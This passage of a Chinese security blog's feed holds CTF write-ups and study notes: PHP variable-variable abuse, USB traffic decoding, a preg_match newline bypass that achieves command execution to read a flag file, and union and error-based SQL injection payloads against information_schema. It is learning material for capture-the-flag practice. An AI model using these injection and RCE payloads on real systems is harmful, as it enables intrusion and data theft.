class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'flag'</span>]) &amp;&amp; !<span class="keyword">isset</span>($_POST[<span class="string">'flag'</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>($yds);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'flag'</span>] === <span class="string">'flag'</span>  || $_GET[<span class="string">'flag'</span>] === <span class="string">'flag'</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>($is);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"the flag is: "</span>.$flag;</span><br></pre></td></tr></table></figure>

<p>来稍微讲讲这段代码吧，自己php也懂得不多，也是一步步调试才看懂的（我太菜了.jpg）</p>
<p>首先是foreach这个函数，这里拿get这段来将吧，post这题其实用不到</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">    $$x = $$y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当这里输入 <code>xxx/?yds=flag</code> 后，括号中的$x为yds，$y为flag；然后里面的$$x表示$yds，$$y表示$flag，这个时候就把flag的值赋给了yds</p>
<p>这就是所谓的可变变量，就是把一个变量的值变为另一个变量的名字</p>
<p>这题只要输入这个就出结果了，因为下面的三个exit中，只会执行这一段</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'flag'</span>]) &amp;&amp; !<span class="keyword">isset</span>($_POST[<span class="string">'flag'</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>($yds);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因为我们传入的get参数中没有flag，也没post传入任何参数，所以就直接带着$yds退出了，而yds中之前就保存了flag的值，到这里也就出结果了</p>
<p>最后附上一些调试截图方便理解</p>
<p><img src="/2020/06/23/BJDCTF2020-Mark-loves-cat/1.png" alt></p>
<p>执行完get的foreach，此时yds变量已经变成了flag的值</p>
<p><img src="/2020/06/23/BJDCTF2020-Mark-loves-cat/2.png" alt></p>
<p>不会执行其他的exit因为都不满足条件，此时就会带着yds，也就是flag的值退出</p>
<p><img src="/2020/06/23/BJDCTF2020-Mark-loves-cat/3.png" alt></p>
]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>php代码审计</tag>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title>DASCTF八月赛-misc-eeeeeeeasyusb</title>
    <url>/2020/08/27/DASCTF%E5%85%AB%E6%9C%88%E8%B5%9B-misc-eeeeeeeasyusb/</url>
    <content><![CDATA[<p>这道题是这次八月赛的一道200分的杂项，脑洞挺多，题目质量也好，不愧是<strong>L1near</strong>师傅出的题，i了i了</p>
<h2 id="零宽字符和坚果云"><a href="#零宽字符和坚果云" class="headerlink" title="零宽字符和坚果云"></a>零宽字符和坚果云</h2><p>首先这道题目给的信息真的非常的少，就一个txt文件，当时比赛的时候真的几乎啥也没看出来</p>
<p>打开txt，可以看到给了一串神秘代码</p>
<p><img src="/2020/08/27/DASCTF%E5%85%AB%E6%9C%88%E8%B5%9B-misc-eeeeeeeasyusb/1.png" alt="image-20200827202229483"></p>
<p>当时还以为是aes加密啥的，完全没想到居然是个网盘后缀</p>
<p>为什么是坚果云呢？这就涉及到这串字符中的零宽字节隐写了，当时比赛的时候我也发现了这么几个字符文件大小怎么就114字节了，但完全没想零宽字符，我太菜了┭┮﹏┭┮</p>
<p>使用vim就可以清晰的看得到这些零宽字符</p>
<p><img src="/2020/08/27/DASCTF%E5%85%AB%E6%9C%88%E8%B5%9B-misc-eeeeeeeasyusb/5.png" alt="image-20200827204340565"></p>
<p>这里给出一个解码网站，将整一串字符复制过去解码，可以得到nut，也就想到了坚果云，如图</p>
<ul>
<li><a href="http://330k.github.io/misc_tools/unicode_steganography.html" target="_blank" rel="noopener">解码网站</a></li>
</ul>
<p><img src="/2020/08/27/DASCTF%E5%85%AB%E6%9C%88%E8%B5%9B-misc-eeeeeeeasyusb/2.png" alt="image-20200827202846411"></p>
<p>需要注意的是每个零宽字节网站解码出来的结果可能都不一样，所以比赛的时候有些师傅没解对，参考<a href="http://www.ga1axy.top/index.php/archives/20/" target="_blank" rel="noopener">Ga1@xy’s师傅的这篇博客</a>，这个网站也是师傅这取的</p>
<p>去网上找了一番坚果云的前缀，居然没找到，最后自己注册了一个，发现前缀就是<strong>jianguoyun.com/p/</strong>,emmm</p>
<p><img src="/2020/08/27/DASCTF%E5%85%AB%E6%9C%88%E8%B5%9B-misc-eeeeeeeasyusb/3.png" alt="image-20200827203957785"></p>
<p>最后去<a href="https://www.jianguoyun.com/p/DYcbU-gQz_%E2%80%8C%E2%80%8C%E2%80%8C%E2%80%8C%E2%80%8D%EF%BB%BF%E2%80%8D%E2%80%8DTZCBjh8rID" target="_blank" rel="noopener">这个地址</a>可以看到是L1near师傅分享的一个文件，密码就是JmTjw﻿‍‌到此，第一步算是告一段落</p>
<p><img src="/2020/08/27/DASCTF%E5%85%AB%E6%9C%88%E8%B5%9B-misc-eeeeeeeasyusb/4.png" alt="image-20200827204132191"></p>
<h2 id="USB流量分析与键盘鼠标流量解码脚本"><a href="#USB流量分析与键盘鼠标流量解码脚本" class="headerlink" title="USB流量分析与键盘鼠标流量解码脚本"></a>USB流量分析与键盘鼠标流量解码脚本</h2><p>下载下来上面的文件后发现是两个usb的流量包，鉴于之前也没怎么做过usb的流量分析题，所以又进行了一番搜索学习</p>
<p><img src="/2020/08/27/DASCTF%E5%85%AB%E6%9C%88%E8%B5%9B-misc-eeeeeeeasyusb/6.png" alt="image-20200827205013862"></p>
<p>主要参考了<a href="https://blog.csdn.net/qq_36609913/article/details/78578406" target="_blank" rel="noopener">这篇文章</a>和<a href="http://www.fzwjscj.xyz/index.php/archives/38/" target="_blank" rel="noopener">fzwjscj师傅的wp</a></p>
<p>USB协议的数据部分在Leftover Capture Data域之中，在Mac和Linux下可以用tshark命令可以将 leftover capture data单独提取出来 命令如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tshark -r part1.pcapng -T fields -e usb.capdata &gt; usb1data.txt</span><br><span class="line">tshark -r part2.pcapng -T fields -e usb.capdata &gt; usb2data.txt</span><br></pre></td></tr></table></figure>

<p>其中part1是鼠标的，part2是键盘的，提取出来如下图</p>
<p><img src="/2020/08/27/DASCTF%E5%85%AB%E6%9C%88%E8%B5%9B-misc-eeeeeeeasyusb/7.png" alt="image-20200827205700648"></p>
<p>然后就是要用脚本来进行解码了，这里就直接用fzwjscj师傅写好的脚本了，直接用csdn里的那个脚本是解不出来的，要稍微修改，比赛里也提示了是1 3 5字节</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line">nums = []</span><br><span class="line">keys = open(<span class="string">'usb1data.txt'</span>,<span class="string">'r'</span>)</span><br><span class="line">posx = <span class="number">0</span></span><br><span class="line">posy = <span class="number">0</span></span><br><span class="line">res = open(<span class="string">'res.txt'</span>,<span class="string">'a'</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        x = int(line[<span class="number">4</span>:<span class="number">6</span>],<span class="number">16</span>)</span><br><span class="line">        y = int(line[<span class="number">8</span>:<span class="number">10</span>],<span class="number">16</span>)</span><br><span class="line">        <span class="keyword">if</span> x &gt; <span class="number">127</span> :</span><br><span class="line">            x -= <span class="number">256</span></span><br><span class="line">        <span class="keyword">if</span> y &gt; <span class="number">127</span> :</span><br><span class="line">            y -= <span class="number">256</span></span><br><span class="line">        posx += x</span><br><span class="line">        posy += y</span><br><span class="line">        btn_flag = int(line[<span class="number">0</span>:<span class="number">2</span>],<span class="number">16</span>)  <span class="comment"># 1 for left , 2 for right , 0 for nothing</span></span><br><span class="line">        <span class="comment"># print(line[4:6])</span></span><br><span class="line">        <span class="keyword">if</span> btn_flag == <span class="number">1</span> :</span><br><span class="line">            print(posx,posy)</span><br><span class="line">            res.write(str(posx)+<span class="string">' '</span>+str(posy))</span><br><span class="line">            res.write(<span class="string">'\n'</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">res.close()</span><br><span class="line"><span class="comment">#0:2 4:6 8:10对应的就是1，3，5</span></span><br></pre></td></tr></table></figure>

<p>这个脚本运行后得到的是一串坐标，需要用Gnuplot这个软件来绘制出图片，kali上apt安装就行，至于这个软件怎么用可以看看<a href="http://blog.sciencenet.cn/blog-530833-484860.html" target="_blank" rel="noopener">这篇文章</a></p>
<p><img src="/2020/08/27/DASCTF%E5%85%AB%E6%9C%88%E8%B5%9B-misc-eeeeeeeasyusb/8.png" alt="image-20200827210411134"></p>
<p>这里用到的命令是</p>
<p><strong>&gt;plot “res.txt” using 1:2</strong></p>
<p><strong>*以第一列为x轴，第二列为y轴，绘制二维数据图</strong></p>
<p>得到一张上下镜像的图，上下镜像翻转即可得到flag前半段</p>
<p><img src="/2020/08/27/DASCTF%E5%85%AB%E6%9C%88%E8%B5%9B-misc-eeeeeeeasyusb/9.png" alt="123.jpg"></p>
<p><img src="/2020/08/27/DASCTF%E5%85%AB%E6%9C%88%E8%B5%9B-misc-eeeeeeeasyusb/10.png" alt="批注 2020-08-27 192423"></p>
<blockquote>
<p>flag part1: 166433882cd04aaa</p>
</blockquote>
<p>然后就是第二段了，这里也直接贴一个fzwjscj师傅的脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line">normalKeys = &#123;<span class="string">"04"</span>:<span class="string">"a"</span>, <span class="string">"05"</span>:<span class="string">"b"</span>, <span class="string">"06"</span>:<span class="string">"c"</span>, <span class="string">"07"</span>:<span class="string">"d"</span>, <span class="string">"08"</span>:<span class="string">"e"</span>, <span class="string">"09"</span>:<span class="string">"f"</span>, <span class="string">"0a"</span>:<span class="string">"g"</span>, <span class="string">"0b"</span>:<span class="string">"h"</span>, <span class="string">"0c"</span>:<span class="string">"i"</span>, <span class="string">"0d"</span>:<span class="string">"j"</span>, <span class="string">"0e"</span>:<span class="string">"k"</span>, <span class="string">"0f"</span>:<span class="string">"l"</span>, <span class="string">"10"</span>:<span class="string">"m"</span>, <span class="string">"11"</span>:<span class="string">"n"</span>, <span class="string">"12"</span>:<span class="string">"o"</span>, <span class="string">"13"</span>:<span class="string">"p"</span>, <span class="string">"14"</span>:<span class="string">"q"</span>, <span class="string">"15"</span>:<span class="string">"r"</span>, <span class="string">"16"</span>:<span class="string">"s"</span>, <span class="string">"17"</span>:<span class="string">"t"</span>, <span class="string">"18"</span>:<span class="string">"u"</span>, <span class="string">"19"</span>:<span class="string">"v"</span>, <span class="string">"1a"</span>:<span class="string">"w"</span>, <span class="string">"1b"</span>:<span class="string">"x"</span>, <span class="string">"1c"</span>:<span class="string">"y"</span>, <span class="string">"1d"</span>:<span class="string">"z"</span>,<span class="string">"1e"</span>:<span class="string">"1"</span>, <span class="string">"1f"</span>:<span class="string">"2"</span>, <span class="string">"20"</span>:<span class="string">"3"</span>, <span class="string">"21"</span>:<span class="string">"4"</span>, <span class="string">"22"</span>:<span class="string">"5"</span>, <span class="string">"23"</span>:<span class="string">"6"</span>,<span class="string">"24"</span>:<span class="string">"7"</span>,<span class="string">"25"</span>:<span class="string">"8"</span>,<span class="string">"26"</span>:<span class="string">"9"</span>,<span class="string">"27"</span>:<span class="string">"0"</span>,<span class="string">"28"</span>:<span class="string">"&lt;RET&gt;"</span>,<span class="string">"29"</span>:<span class="string">"&lt;ESC&gt;"</span>,<span class="string">"2a"</span>:<span class="string">"&lt;DEL&gt;"</span>, <span class="string">"2b"</span>:<span class="string">"\t"</span>,<span class="string">"2c"</span>:<span class="string">"&lt;SPACE&gt;"</span>,<span class="string">"2d"</span>:<span class="string">"-"</span>,<span class="string">"2e"</span>:<span class="string">"="</span>,<span class="string">"2f"</span>:<span class="string">"["</span>,<span class="string">"30"</span>:<span class="string">"]"</span>,<span class="string">"31"</span>:<span class="string">"\\"</span>,<span class="string">"32"</span>:<span class="string">"&lt;NON&gt;"</span>,<span class="string">"33"</span>:<span class="string">";"</span>,<span class="string">"34"</span>:<span class="string">"'"</span>,<span class="string">"35"</span>:<span class="string">"&lt;GA&gt;"</span>,<span class="string">"36"</span>:<span class="string">","</span>,<span class="string">"37"</span>:<span class="string">"."</span>,<span class="string">"38"</span>:<span class="string">"/"</span>,<span class="string">"39"</span>:<span class="string">"&lt;CAP&gt;"</span>,<span class="string">"3a"</span>:<span class="string">"&lt;F1&gt;"</span>,<span class="string">"3b"</span>:<span class="string">"&lt;F2&gt;"</span>, <span class="string">"3c"</span>:<span class="string">"&lt;F3&gt;"</span>,<span class="string">"3d"</span>:<span class="string">"&lt;F4&gt;"</span>,<span class="string">"3e"</span>:<span class="string">"&lt;F5&gt;"</span>,<span class="string">"3f"</span>:<span class="string">"&lt;F6&gt;"</span>,<span class="string">"40"</span>:<span class="string">"&lt;F7&gt;"</span>,<span class="string">"41"</span>:<span class="string">"&lt;F8&gt;"</span>,<span class="string">"42"</span>:<span class="string">"&lt;F9&gt;"</span>,<span class="string">"43"</span>:<span class="string">"&lt;F10&gt;"</span>,<span class="string">"44"</span>:<span class="string">"&lt;F11&gt;"</span>,<span class="string">"45"</span>:<span class="string">"&lt;F12&gt;"</span>&#125;</span><br><span class="line"></span><br><span class="line">shiftKeys = &#123;<span class="string">"04"</span>:<span class="string">"A"</span>, <span class="string">"05"</span>:<span class="string">"B"</span>, <span class="string">"06"</span>:<span class="string">"C"</span>, <span class="string">"07"</span>:<span class="string">"D"</span>, <span class="string">"08"</span>:<span class="string">"E"</span>, <span class="string">"09"</span>:<span class="string">"F"</span>, <span class="string">"0a"</span>:<span class="string">"G"</span>, <span class="string">"0b"</span>:<span class="string">"H"</span>, <span class="string">"0c"</span>:<span class="string">"I"</span>, <span class="string">"0d"</span>:<span class="string">"J"</span>, <span class="string">"0e"</span>:<span class="string">"K"</span>, <span class="string">"0f"</span>:<span class="string">"L"</span>, <span class="string">"10"</span>:<span class="string">"M"</span>, <span class="string">"11"</span>:<span class="string">"N"</span>, <span class="string">"12"</span>:<span class="string">"O"</span>, <span class="string">"13"</span>:<span class="string">"P"</span>, <span class="string">"14"</span>:<span class="string">"Q"</span>, <span class="string">"15"</span>:<span class="string">"R"</span>, <span class="string">"16"</span>:<span class="string">"S"</span>, <span class="string">"17"</span>:<span class="string">"T"</span>, <span class="string">"18"</span>:<span class="string">"U"</span>, <span class="string">"19"</span>:<span class="string">"V"</span>, <span class="string">"1a"</span>:<span class="string">"W"</span>, <span class="string">"1b"</span>:<span class="string">"X"</span>, <span class="string">"1c"</span>:<span class="string">"Y"</span>, <span class="string">"1d"</span>:<span class="string">"Z"</span>,<span class="string">"1e"</span>:<span class="string">"!"</span>, <span class="string">"1f"</span>:<span class="string">"@"</span>, <span class="string">"20"</span>:<span class="string">"#"</span>, <span class="string">"21"</span>:<span class="string">"$"</span>, <span class="string">"22"</span>:<span class="string">"%"</span>, <span class="string">"23"</span>:<span class="string">"^"</span>,<span class="string">"24"</span>:<span class="string">"&amp;"</span>,<span class="string">"25"</span>:<span class="string">"*"</span>,<span class="string">"26"</span>:<span class="string">"("</span>,<span class="string">"27"</span>:<span class="string">")"</span>,<span class="string">"28"</span>:<span class="string">"&lt;RET&gt;"</span>,<span class="string">"29"</span>:<span class="string">"&lt;ESC&gt;"</span>,<span class="string">"2a"</span>:<span class="string">"&lt;DEL&gt;"</span>, <span class="string">"2b"</span>:<span class="string">"\t"</span>,<span class="string">"2c"</span>:<span class="string">"&lt;SPACE&gt;"</span>,<span class="string">"2d"</span>:<span class="string">"_"</span>,<span class="string">"2e"</span>:<span class="string">"+"</span>,<span class="string">"2f"</span>:<span class="string">"&#123;"</span>,<span class="string">"30"</span>:<span class="string">"&#125;"</span>,<span class="string">"31"</span>:<span class="string">"|"</span>,<span class="string">"32"</span>:<span class="string">"&lt;NON&gt;"</span>,<span class="string">"33"</span>:<span class="string">"\""</span>,<span class="string">"34"</span>:<span class="string">":"</span>,<span class="string">"35"</span>:<span class="string">"&lt;GA&gt;"</span>,<span class="string">"36"</span>:<span class="string">"&lt;"</span>,<span class="string">"37"</span>:<span class="string">"&gt;"</span>,<span class="string">"38"</span>:<span class="string">"?"</span>,<span class="string">"39"</span>:<span class="string">"&lt;CAP&gt;"</span>,<span class="string">"3a"</span>:<span class="string">"&lt;F1&gt;"</span>,<span class="string">"3b"</span>:<span class="string">"&lt;F2&gt;"</span>, <span class="string">"3c"</span>:<span class="string">"&lt;F3&gt;"</span>,<span class="string">"3d"</span>:<span class="string">"&lt;F4&gt;"</span>,<span class="string">"3e"</span>:<span class="string">"&lt;F5&gt;"</span>,<span class="string">"3f"</span>:<span class="string">"&lt;F6&gt;"</span>,<span class="string">"40"</span>:<span class="string">"&lt;F7&gt;"</span>,<span class="string">"41"</span>:<span class="string">"&lt;F8&gt;"</span>,<span class="string">"42"</span>:<span class="string">"&lt;F9&gt;"</span>,<span class="string">"43"</span>:<span class="string">"&lt;F10&gt;"</span>,<span class="string">"44"</span>:<span class="string">"&lt;F11&gt;"</span>,<span class="string">"45"</span>:<span class="string">"&lt;F12&gt;"</span>&#125;</span><br><span class="line"></span><br><span class="line">nums = []</span><br><span class="line">keys = open(<span class="string">'data.txt'</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys:</span><br><span class="line">    <span class="keyword">if</span> len(line)!=<span class="number">17</span>: <span class="comment">#首先过滤掉鼠标等其他设备的USB流量</span></span><br><span class="line">         <span class="keyword">continue</span></span><br><span class="line">    nums.append(line[<span class="number">0</span>:<span class="number">2</span>]+line[<span class="number">4</span>:<span class="number">6</span>]) <span class="comment">#取一、三字节</span></span><br><span class="line">keys.close()</span><br><span class="line">output = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> nums:</span><br><span class="line">    <span class="keyword">if</span> n[<span class="number">2</span>:<span class="number">4</span>] == <span class="string">"00"</span> :</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> n[<span class="number">2</span>:<span class="number">4</span>] <span class="keyword">in</span> normalKeys:</span><br><span class="line">        <span class="keyword">if</span> n[<span class="number">0</span>:<span class="number">2</span>]==<span class="string">"02"</span>: <span class="comment">#表示按下了shift</span></span><br><span class="line">            output += shiftKeys [n[<span class="number">2</span>:<span class="number">4</span>]]</span><br><span class="line">        <span class="keyword">else</span> :</span><br><span class="line">            output += normalKeys [n[<span class="number">2</span>:<span class="number">4</span>]]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        output += <span class="string">'[unknown]'</span></span><br><span class="line">print(<span class="string">'output :\n'</span> + output)</span><br></pre></td></tr></table></figure>

<p>得到输出</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">output :</span><br><span class="line"><span class="number">056</span>&lt;F2&gt;&lt;F2&gt;&lt;F2&gt;&lt;F2&gt;&lt;F3&gt;&lt;F2&gt;&lt;F2&gt;&lt;F2&gt;&lt;F3&gt;&lt;F3&gt;<span class="number">4</span>&lt;F2&gt;&lt;F2&gt;&lt;F2&gt;&lt;F2&gt;&lt;F2&gt;&lt;F2&gt;&lt;F2&gt;&lt;F2&gt;&lt;F3&gt;&lt;F3&gt;<span class="number">29</span>&lt;F2&gt;&lt;F2&gt;&lt;F2&gt;&lt;F2&gt;&lt;F3&gt;&lt;F2&gt;&lt;F2&gt;&lt;F2&gt;&lt;F2&gt;&lt;F3&gt;<span class="number">522</span>&lt;F2&gt;&lt;F2&gt;&lt;F2&gt;&lt;F2&gt;&lt;F3&gt;</span><br></pre></td></tr></table></figure>

<p>这最后还是需要一点脑洞，根据part1又16位，part2应该也有16位，已知的9位以及35个F2,F3，以可知道5个F2,F3为一个字符，所以位培根密码，F2是a，F3是b，最后解码即可</p>
<blockquote>
<p>flag part2:056bd4ad29bb522b</p>
</blockquote>
<h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h2><p>flag:166433882cd04aaa056bd4ad29bb522b</p>
]]></content>
      <categories>
        <category>学习记录,writeup</category>
      </categories>
      <tags>
        <tag>misc</tag>
        <tag>usb流量分析</tag>
      </tags>
  </entry>
  <entry>
    <title>[FBCTF2019]RCEService</title>
    <url>/2020/08/14/FBCTF2019-RCEService/</url>
    <content><![CDATA[<p>打开发现一个需要输入json的的页面</p>
<p><img src="/2020/08/14/FBCTF2019-RCEService/1.png" alt></p>
<p>随便输入个数发现出现cmd，于是尝试这样输入</p>
<p><img src="/2020/08/14/FBCTF2019-RCEService/2.png" alt></p>
<p>发现只能执行ls，其他命令都不行</p>
<p>在<a href="https://xz.aliyun.com/t/5399" target="_blank" rel="noopener">先知</a>中找到了后台的源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">putenv(<span class="string">'PATH=/home/rceservice/jail'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_REQUEST[<span class="string">'cmd'</span>])) &#123;</span><br><span class="line">  $json = $_REQUEST[<span class="string">'cmd'</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!is_string($json)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Hacking attempt detected&lt;br/&gt;&lt;br/&gt;'</span>;</span><br><span class="line">  &#125; <span class="keyword">elseif</span> (preg_match(<span class="string">'/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/'</span>, $json)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Hacking attempt detected&lt;br/&gt;&lt;br/&gt;'</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Attempting to run command:&lt;br/&gt;'</span>;</span><br><span class="line">    $cmd = json_decode($json, <span class="keyword">true</span>)[<span class="string">'cmd'</span>];</span><br><span class="line">    <span class="keyword">if</span> ($cmd !== <span class="keyword">NULL</span>) &#123;</span><br><span class="line">      system($cmd);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">'Invalid input'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;br/&gt;&lt;br/&gt;'</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>过滤的很严，但是可以绕过preg_match函数本身</p>
<p><strong>因为preg_match只会去匹配第一行，所以这里可以用多行进行绕过，就是加入%0A即可，记得前面后面都加上</strong></p>
<p>源码中可以看到putenv(‘PATH=/home/rceservice/jail’)已经修改了环境变量，我们只能用绝对路径来调用系统命令</p>
<p>命令在/bin中保存</p>
<p>根目录下并没有flag，查看/home/rceservice/发现flag</p>
<p><img src="/2020/08/14/FBCTF2019-RCEService/3.png" alt></p>
<p><img src="/2020/08/14/FBCTF2019-RCEService/4.png" alt></p>
<p>所以构造出payload ，%0A是换行符</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&#123;%0A"cmd": "/bin/cat /home/rceservice/flag"%0A&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/14/FBCTF2019-RCEService/5.png" alt></p>
]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入一</title>
    <url>/2020/06/22/SQL%E6%B3%A8%E5%85%A5%E4%B8%80/</url>
    <content><![CDATA[<h3 id="1-sql注入步骤开始清晰（整型注入）"><a href="#1-sql注入步骤开始清晰（整型注入）" class="headerlink" title="1.sql注入步骤开始清晰（整型注入）"></a>1.sql注入步骤开始清晰（整型注入）</h3><p>​        union select 的作用是将两次查询结果和为一次再输出，先用union select *，*，*…等来判断字段列数，无报错及说明字段名猜测成功，之后再让前面查询的id查不出来（id输入很大或者可以and 0），即可只显示union select的内容。前台返回结果并不是表真实列数，再查看哪个字段有回显，即前台显示的是哪几个字段内容。</p>
<p>​        Mysql所有内容都存储于information_schema库中，里面有三个重要字段schemamata(存放所有数据库信息schema_name)，tables(存放所有数据库中的表名 table_name，table_schema表所属数据库名)，columns(存放前包含前两者的东西加上字段名column_name，内容最为详细).<br>​        Group_concat语句用于将所有查询出来的内容拼为一行，不然只会显示一个数据，如<code>Group_concat（schema_name）</code><br>​        Database（）用于查询当前数据库名称，如<code>select 1,database(),3 from information_schema.schemata（可以不加from）</code><br>​        知道数据库之后可以开始查询当前数据库所有表名，语句为 <code>select group_concat(table_name) from information_schema.tables where table_schema=database()</code><br>​        知道表名后可以开始查询当前表中所有字段名，语句为<code>select group_concat(column_name) from information_schema.columns where table_schema=database() and tablename=xxx(自己想查的表)</code><br>​        知道字段名称可以开始查数据了,语句为select 1,group_contact(字段名)，3 from 查出来数据库名.表名<br>​        Contact_ws函数用于将两个字段一起显示，例 <code>concat_ws(‘:’,user,pwd)</code>就是将两个字段以冒号分隔一起显示，想显示所有再在外面加<code>group_concat(concat_ws(&#39;:&#39;,user,pwd))</code><br>​        快速判断几列可以用order by，原理：order by x(数字)将会按照第x列来进行排序，超过了便会报错，所以能够快速确定列数</p>
<h3 id="2-基于报错的GET单引号双引号注入"><a href="#2-基于报错的GET单引号双引号注入" class="headerlink" title="2.基于报错的GET单引号双引号注入"></a>2.基于报错的GET单引号双引号注入</h3><p>​        在id=x后面加单（双引号）观察是否会报错，根据报错语句来实行注入，让我们自己的语句能够闭合（加单双引号，括号等），同时将后面的语句注释掉，一般可以用的方式有加/**/(基本用不上)，–+（加号等于空格），%23（#的url编码，直接输入不会被转义所以要这样），从而实现注入</p>
<h3 id="3-基于报错的POST单引号双引号注入"><a href="#3-基于报错的POST单引号双引号注入" class="headerlink" title="3.基于报错的POST单引号双引号注入"></a>3.基于报错的POST单引号双引号注入</h3><p>（以前写的，仅针对当时看的例子，很多地方表述不清，见谅）</p>
<p>​        一般为登陆界面，也是单双引号，不能在url中输入，需要在账户名密码中进行注入，在username中进行注入是，由于不知道账户是否存在，应该在username里闭合后加上 or 1，让其永远为真 ，这里的注释符号跟上面相同，但要多试几次，因为可能会被url转义，#可以直接用，不再需要变成23%，注释掉后sql语句中便不再判断密码，即可登陆成功（在用hackbar的时候passwd一般不能少）</p>
<h3 id="4-基于报错的POST双注入"><a href="#4-基于报错的POST双注入" class="headerlink" title="4.基于报错的POST双注入"></a>4.基于报错的POST双注入</h3><p>​        由于有时候加只加单引号或者双引号不能根据报错得到我们想知道的东西，所以有时候需要单双引号一起用，再根据报错来判断sql语句，实现注入。<br>​        知道用户名的情况下可以不用加or 1，就会登陆到当前用户名账户。使用之前的方式，发现order by判断列数成功后，union select却不回显数据，就需要 用到双注入。<br>​        先自己尝试，在mysql中自己查询数据发现</p>
<p><img src="/2020/06/22/SQL%E6%B3%A8%E5%85%A5%E4%B8%80/s1.png" alt="s1"></p>
<p>​        group by之后直接查询所有数据只会返回分类后的第一条。<br>​        Group by 后面如果加数字，那么就是根据select中的东西作为主键，如下图</p>
<p><img src="/2020/06/22/SQL%E6%B3%A8%E5%85%A5%E4%B8%80/s2.png" alt="s2"></p>
<p>Group by 1就是以table_schema作为主键，2就是count（*）<br>        使用group by * 会新生成一个临时表，临时表中*为主键，不能重复，所以利用这一特性，可以用rand函数实现注入，让其出错，从而从报错信息中获取数据，具体payload如下<br><code>Union select table_schema,count(*) from information_schema.tables group by concat(floor(rand()*2),version());</code> </p>
<p>​        其中的version()就是我们想要查询的内容，可以换成其他我们想查的，如database()等,floor是将rand值转化为整型，即只取0,1（必不可少），我们所需要知道的信息就全都在报错语句里。（如下图）</p>
<p><img src="/2020/06/22/SQL%E6%B3%A8%E5%85%A5%E4%B8%80/s3.png" alt="s3"></p>
<p>5.5.20即为数据库版本号，在错误信息里输出了<br>        在version这个地方就是我们要双注入的地方了，之所以叫双注入就是因为在这里要在查询一次，payload如下(例子)<br><code>Union select table_schema,count(*) from information_schema.tables group by concat(floor(rand()*2),(select group_concat(table_name) from information_schema.tables where table_schema=database()))</code><br>        这时候使用group_concat肯能导致查询数据太长查不出啦，可以在后面加<br>limit 0,1来限制返回行数，第一个数字代表第几行开始，第二个数字代表查几行如下<br><code>Union select table_schema,count(*) from information_schema.tables group by concat(floor(rand()*2),(select table_name from information_schema.tables where table_schema=database() limit 0,1))</code><br>        不报错就可能是查完了，当group by两个都错的时候他就会以一种奇特的方式运行，反到可以查出数据来，所以这时就确定了有几个表<br>        注意双注入要多试几次因为rand可能随机到一样的，直到报错为止</p>
]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
